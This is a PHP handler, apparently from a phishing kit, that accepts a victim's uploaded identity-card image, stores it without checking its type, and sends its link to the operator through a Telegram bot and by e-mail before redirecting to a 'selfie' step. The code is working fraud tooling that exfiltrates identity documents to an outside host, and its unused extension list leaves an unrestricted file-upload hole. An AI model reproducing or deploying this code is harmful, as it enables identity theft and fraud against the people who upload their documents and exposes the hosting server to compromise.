f<?php

include("../infos.php");
include("../common/sub_includes.php");

function telegram_send($photo, $api_key, $chat_id) {
  $curl = curl_init();
  $format   = 'HTML';
  curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendPhoto?chat_id='. $chat_id .'&photo='. $photo);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
  $result = curl_exec($curl);
  curl_close($curl);
  return true;
}

function getUrl()
{
   if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') 
    $url = "https"; 
   else
    $url = "http"; 
    
  // Ajoutez // à l'URL.
  $url .= "://"; 
    
  // Ajoutez l'hôte (nom de domaine, ip) à l'URL.
  $url .= $_SERVER['HTTP_HOST']; 
    
  // Ajouter l'emplacement de la ressource demandée à l'URL
      
  // Afficher l'URL
  return $url; 
}

if(isset($_FILES['fileUpload'])){
      $errors= array();
      $file_name = $_FILES['fileUpload']['name'];
      $file_size =$_FILES['fileUpload']['size'];
      $file_tmp =$_FILES['fileUpload']['tmp_name'];
      $file_type=$_FILES['fileUpload']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['fileUpload']['name'])));
      
      $extensions= array("jpeg","jpg","png");
      
      
      
      if(empty($errors)==true){

         $link = "images/".$file_name;
         move_uploaded_file($file_tmp, $link);

         $photo = getUrl() . substr(realpath(dirname(__FILE__)),strlen($_SERVER["DOCUMENT_ROOT"]),strlen(realpath(dirname(__FILE__)))) . '/' . $link;
         //echo $photo;

         //$photo = 'https://media.istockphoto.com/photos/cat-with-blue-eyes-looks-at-camera-picture-id1067347086?k=20&m=1067347086&s=612x612&w=0&h=Wxch207ChCoqnlqa5zvuy17J_YyApm42L6rUN3hml54=';

        $head="From: cc@cash.comn";
         $head.="Cc: cc@cash.comn";
         $head.="Content-Type: text/html; charset=iso-8859-1";

        $Subject=  "  =?UTF-8?Q?=e2=9d=a4_?= SCI BERYL  \xf0\x9f\x92\xb3 | ";
        $message = "
         CNI-RECTO: <img src='$photo'>
        ";

        telegram_send($photo, $bot_token, $chat_login);
        $mail=mail($my_mail,$Subject,$message,$head);


         //echo "Success";
         header('Location: ../steps/selfie.php');
      }else{
         print_r($errors);
      }

         


         
   }
    
?>